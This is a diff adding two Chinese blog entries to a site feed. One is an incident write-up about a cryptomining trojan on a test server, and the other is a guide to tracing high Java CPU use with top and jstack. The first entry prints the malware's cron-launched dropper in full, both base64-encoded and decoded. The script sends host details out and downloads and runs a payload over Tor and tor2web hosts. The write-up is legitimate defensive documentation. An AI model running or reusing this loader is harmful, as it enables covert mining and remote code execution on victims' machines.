@@ -4,6 +4,58 @@
   
     
     <entry>
+      <title>记录一次木马进程导致CPU 700%处理经过</title>
+      <link href="/2020/11/13/trojan-process-cpu-100/"/>
+      <url>/2020/11/13/trojan-process-cpu-100/</url>
+      
+        <content type="html"><![CDATA[<h2 id="事件描述"><a href="#事件描述" class="headerlink" title="事件描述"></a>事件描述</h2><p>登陆到测试服务器，发现CPU使用率飙到了700%，可能是机器被攻击。看进程名称，是一个异常进程在搞怪。<br><img src="F4C55F2F-BAE1-43E7-9444-98B7B0F1783D.png" alt></p><h2 id="处理过程"><a href="#处理过程" class="headerlink" title="处理过程"></a>处理过程</h2><ol><li>为了让机器尽快恢复，用<code>kill -9 18616</code>杀掉了这个进程。<br>没想到一会儿进程又出现了，CPU继续飙升。猜测应该是有定时任务在运行</li><li>执行<code>crontab -l</code> 发现果然有一条定时任务。<br><code>57 * * * * /root/.systemd-service.sh &gt; /dev/null 2&gt;&amp;1 &amp;</code><br><img src="1B372739-4214-4D44-A1F4-346BBF8C45E0.png" alt></li><li>此时执行<code>crontab -e</code> 删除掉定时任务。过了一会流氓进程又死灰复燃。应该是还有其他定时任务，或者主进程没有清理</li><li>定位到脚本<br>定位到定时任务脚本(仅供学习)：<pre class="line-numbers language-shell"><code class="language-shell">#!/bin/bash#exec &>/dev/nullecho GmqsLAjf/AU0zNSys0cvX3jvDVQ+RgnpxMER8UQt5sWoBaWlXHA7Zevn9+vXesLeecho R21xc0xBamYvQVUwek5TeXMwY3ZYM2p2RFZRK1JnbnB4TUVSOFVRdDVzV29CYVdsWEhBN1pldm45K3ZYZXNMZQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ5cnh4eHFpYTQ1eHhjZHFmd3l4NHBrNnVmeWFuYXpkd2pidjNkZTdyNG1ydHl6dHQ1bXB3MzV5ZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gLiAkSE9NRSAvdXNyL2JpbiAkZCAvdG1wIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmZXhlCmY9L2ludC4kKHVuYW1lIC1tKQp4PS4vJChkYXRlfG1kNXN1bXxjdXQgLWYxIC1kLSkKcj0kKGN1cmwgLTRmc1NMayBjaGVja2lwLmFtYXpvbmF3cy5jb218fGN1cmwgLTRmc1NMayBpcC5zYilfJCh3aG9hbWkpXyQodW5hbWUgLW0pXyQodW5hbWUgLW4pXyQoaXAgYXxncmVwICdpbmV0ICd8YXdrIHsncHJpbnQgJDInfXxtZDVzdW18YXdrIHsncHJpbnQgJDEnfSlfJChjcm9udGFiIC1sfGJhc2U2NCAtdzApCiRjIC14IHNvY2tzNWg6Ly8kczo5MDUwICR0Lm9uaW9uJGYgLW8keCAtZSRyIHx8ICRjICQxJGYgLW8keCAtZSRyCmNobW9kICt4ICR4OyR4O3JtIC1mICR4Cn0KCmZvciBoIGluIHRvcjJ3ZWIuaW4gdG9yMndlYi5pdCBvbmlvbi5mb3VuZGF0aW9uIHRvcjJ3ZWIuc3Ugb25pb24uY29tLmRlIG9uaW9uLnNoIHRvcjJ3ZWIuaW8KZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLTEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1czsgdGhlbgp1ICR0LiRoCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>发现shell内容用base64编码过了。用base64进行解码，发现是挖矿脚本。<pre class="line-numbers language-shell"><code class="language-shell">exec &>/dev/nullexport PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbind=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)c=$(echo "curl -4fsSLkA- -m200")t=$(echo "yrxxxqia45xxcdqfwyx4pk6ufyanazdwjbv3de7r4mrtyztt5mpw35yd")sockz() {n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)p=$(echo "dns-query?name=relay.tor2socks.in")s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" |tr ' ' '\n'|sort -uR|head -1)}fexe() {for i in . $HOME /usr/bin $d /tmp /var/tmp ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done}u() {sockzfexef=/int.$(uname -m)x=./$(date|md5sum|cut -f1 -d-)r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0)$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$rchmod +x $x;$x;rm -f $x}for h in tor2web.in tor2web.it onion.foundation tor2web.su onion.com.de onion.sh tor2web.iodoif ! ls /proc/$(head -1 /tmp/.X11-unix/01)/status; thenu $t.$helsebreakfidone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>用<code>lsof -c 进程名</code>查看该进程的系统调用信息。发现相应控制客户端已经删除使用。<br><img src="22B9B55F-B9BB-4FB9-BA4A-79C2D88689A5.png" alt></li><li><code>pstree</code> 可以看到两个异常进程。用<code>ps -ef</code>获取异常进程信息。一个应该是主进程，一个应该是控制进程。</li><li><code>kill -9 两个木马进程ID</code>删除掉进程。过了一会又启动，推测是有定时任务没清理干净。使用命令<code>ls /etc/cron.d</code>查看到里面还有一个0开头的文件存放着定时任务。<br>删除，然后删掉两个木马进程。删掉垃圾脚本</li><li>系统恢复了短暂的宁静又出现了。查看登陆日志<code>tail -F -n 1000 /var/log/auth.log | grep &#39;failed&#39;</code> ,内网主机在ssh攻击破解。<br>解决办法：<br>修改密码<br>安装fail2ban安全工具<pre class="line-numbers language-shell"><code class="language-shell">sudo apt-get upgradesudo apt-get install -y fail2bansudo systemctl start fail2bansudo nano /etc/fail2ban/jail.local#jail.local 文件内添加[sshd]enabled = trueport = 22filter = sshdlogpath = /var/log/auth.logmaxretry = 3sudo systemctl restart fail2ban<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="005A7DC9-BDD5-4059-A459-90643A3E91C2.png" alt></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>服务器安全问题不容忽视，设置强密码，并控制防火墙，修改ssh默认端口号。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.base64decode.org/" target="_blank" rel="noopener">base64编解码工具</a><br><a href="https://cloud.tencent.com/developer/article/1591665" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1591665【类似病毒】</a><br><a href="https://www.freebuf.com/articles/system/208804.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/208804.html</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 运维 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 运维 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Java进程导致CPU使用达到了100%，如何排查，定位，解决该问题？</title>
+      <link href="/2020/11/13/java-process-cpu-100/"/>
+      <url>/2020/11/13/java-process-cpu-100/</url>
+      
+        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>开发生产中，有时候我们会碰到告警，CPU过高，超过100%，这个时候我们应该怎么办？</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="java进程导致CPU过高"><a href="#java进程导致CPU过高" class="headerlink" title="java进程导致CPU过高"></a>java进程导致CPU过高</h3><h4 id="定位耗费CPU的进程"><a href="#定位耗费CPU的进程" class="headerlink" title="定位耗费CPU的进程"></a>定位耗费CPU的进程</h4><p><code>top -c</code>命令,显示进程列表。然后输入P(大写),按照CPU排序。<br><img src="49D3D198-C786-4A88-AE17-30EAF6CFE578.png" alt><br>如果是Java进程引起的CPU偏高，然后分析为什么这个Java进程对应的线程。进而找到原因。</p><h4 id="定位耗费CPU的线程"><a href="#定位耗费CPU的线程" class="headerlink" title="定位耗费CPU的线程"></a>定位耗费CPU的线程</h4><p><code>top -Hp 进程ID</code>，输入P按照CPU排序。<br><img src="589EC661-44B6-492A-B1B2-6AE71BB007E2.png" alt></p><h4 id="定位哪段代码导致CPU过高"><a href="#定位哪段代码导致CPU过高" class="headerlink" title="定位哪段代码导致CPU过高"></a>定位哪段代码导致CPU过高</h4><p><code>printf &quot;%x\n&quot; 线程ID</code> 把线程pid转换为16进制。<br><img src="DD7F696C-FBEB-4925-BD84-FD6FB267022F.png" alt><br>然后用jstack命令打印进程的堆栈信息，通过grep那个线程的16进制pid，找到那个线程相关的东西。在打印的对战信息中，查找是哪个类的哪个方法导致的CPU 100%的问题。然后去解决问题。<br><code>jstack 进程ID ｜ grep &#39;0x16进制线程ID&#39; -C5 --color</code><br><img src="810E40C9-706F-4950-9D3F-49BC088E012B.png" alt><br>最后得知是代码中存在死循环导致的（测试使用，要是想让CPU跑的更满，可以启用自己CPU一致的线程数，分别死循环）：<br><img src="230B3B03-8067-4628-BBF0-4FEACADFCF27.png" alt></p><p>修改代码，解决问题。</p><p>注意：<br>在编写代码时候，注意循环条件推出方式</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 运维 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 运维 </tag>
+            
+            <tag> 面试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>面向对象的理解</title>
       <link href="/2020/08/12/object-oritened-feature/"/>
       <url>/2020/08/12/object-oritened-feature/</url>
